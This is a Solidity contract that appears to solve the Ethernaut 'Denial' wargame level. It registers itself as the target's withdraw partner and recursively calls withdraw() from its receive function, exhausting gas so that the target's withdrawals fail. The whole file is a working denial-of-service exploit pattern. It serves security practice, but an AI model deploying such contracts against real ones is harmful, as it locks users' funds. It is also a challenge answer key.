// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}

contract DenialAttack {
    IDenial public ethernautInstance;

    constructor (address instanceAddress) {
        ethernautInstance = IDenial(instanceAddress);
        ethernautInstance.setWithdrawPartner(address(this));
    }

    receive() payable external {
        ethernautInstance.withdraw();
    }
}